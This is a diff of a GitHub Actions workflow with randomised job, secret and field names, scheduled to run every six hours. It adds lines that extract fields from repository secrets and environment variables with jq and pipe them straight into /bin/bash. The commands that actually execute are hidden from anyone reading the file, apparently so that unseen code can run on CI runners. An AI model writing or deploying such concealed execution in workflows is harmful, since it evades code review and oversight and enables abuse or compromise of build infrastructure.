@@ -1,10 +1,10 @@
 name: qujiangyou6754
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
-jobs:  # 32683
+    - cron: '21 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,16 @@ jobs:  # 32683
       - uses: actions/checkout@v4
       - name: qujiangyou6754
         env:
-          r50656: ${{ secrets.r50656 }}
+          ylu5003: ${{ secrets.ylu5003 }}
         run: |
-          echo $r50656 | jq -r .ba60587 | /bin/bash
-          echo $jlvr9 | jq -r .x218 | /bin/bash
-          echo $x35283 | jq -r .btz783 | /bin/bash
-          echo $a625 | jq -r .fflzk439 | /bin/bash
+          echo $ylu5003 | jq -r .g3 | /bin/bash
+          echo $s6 | jq -r .zz39937 | /bin/bash
+          echo $vend0365 | jq -r .k18348 | /bin/bash
+          echo $fhz24216 | jq -r .ghc00605 | /bin/bash
+          echo $lvhp8802 | jq -r .l587 | /bin/bash
+          echo $nnixu545 | jq -r .p858 | /bin/bash
+          echo $zu30919 | jq -r .ghowh6 | /bin/bash
+          echo $hj61 | jq -r .injjd824 | /bin/bash
+          echo $umzo762 | jq -r .yq6 | /bin/bash
+          echo $pbmv7 | jq -r .eeoae78 | /bin/bash
 
